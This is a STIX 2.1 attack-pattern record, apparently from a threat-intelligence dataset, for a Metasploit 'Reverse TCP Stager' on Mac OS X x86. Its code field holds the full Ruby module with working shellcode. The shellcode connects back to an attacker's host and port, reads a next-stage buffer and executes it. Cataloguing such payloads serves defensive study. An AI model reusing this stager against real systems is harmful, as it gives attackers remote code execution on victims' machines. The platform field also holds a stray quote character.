{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--42acf729-be17-4792-99b9-d6f5daa62ff5",
    "created": "2024-08-14T16:33:19.474092Z",
    "modified": "2024-08-14T16:33:19.474096Z",
    "name": "Reverse TCP Stager",
    "description": "Connect, read length, read buffer, execute",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/osx/x86/reverse_tcp.rb",
            "external_id": "reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n###\n#\n# ReverseTcp\n# -------\n#\n# Mac OS X x86 Reverse TCP stager.\n#\n###\nmodule MetasploitModule\n\n  CachedSize = 123\n\n  include Msf::Payload::Stager\n\n  def initialize(info = { })\n    super(merge_info(info,\n      'Name'\t\t=> 'Reverse TCP Stager',\n      'Description'\t=> 'Connect, read length, read buffer, execute',\n      'Author'\t=> 'ddz',\n      'License'\t=> MSF_LICENSE,\n      'Platform'\t=> 'osx',\n      'Arch'\t\t=> ARCH_X86,\n      'Handler'\t=> Msf::Handler::ReverseTcp,\n      'Convention'\t=> 'sockedi',\n      'Stager'        =>\n      {\n        'Offsets' =>\n        {\n          'LHOST' => [ 20, 'ADDR'],\n          'LPORT' => [ 27, 'n']\n        },\n        'Payload' =>\n          \"\\x31\\xc0\\x99\\x50\\x40\\x50\\x40\\x50\"+\n          \"\\x52\\xb0\\x61\\xcd\\x80\\x72\\x6c\\x89\"+\n          \"\\xc7\\x52\\x52\\x68\\x7f\\x00\\x00\\x01\"+\n          \"\\x68\\x00\\x02\\x34\\x12\\x89\\xe3\\x6a\"+\n          \"\\x10\\x53\\x57\\x52\\xb0\\x62\\xcd\\x80\"+\n          \"\\x72\\x51\\x89\\xe5\\x83\\xec\\x08\\x31\"+\n          \"\\xc9\\xf7\\xe1\\x51\\x89\\xe6\\xb0\\x04\"+\n          \"\\x50\\x56\\x57\\x50\\x48\\xcd\\x80\\x72\"+\n          \"\\x3a\\x8b\\x74\\x24\\x10\\x31\\xc0\\x50\"+\n          \"\\x50\\x48\\x50\\x40\\x66\\xb8\\x02\\x10\"+\n          \"\\x50\\x31\\xc0\\xb0\\x07\\x50\\x56\\x52\"+\n          \"\\x52\\xb0\\xc5\\xcd\\x80\\x72\\x1c\\x89\"+\n          \"\\xc3\\x01\\xf3\\x56\\x89\\xd8\\x29\\xf0\"+\n          \"\\x50\\x57\\x52\\x31\\xc0\\xb0\\x03\\xcd\"+\n          \"\\x80\\x72\\x08\\x29\\xc3\\x29\\xc6\\x75\"+\n          \"\\xea\\xff\\xe3\"\n      }\n    ))\n  end\n\n  def handle_intermediate_stage(conn, p)\n    #\n    # Our stager payload expects to see a next-stage length first.\n    #\n    conn.put([p.length].pack('V'))\n  end\nend\n",
    "x_mitre_platforms": [
        "osx'"
    ]
}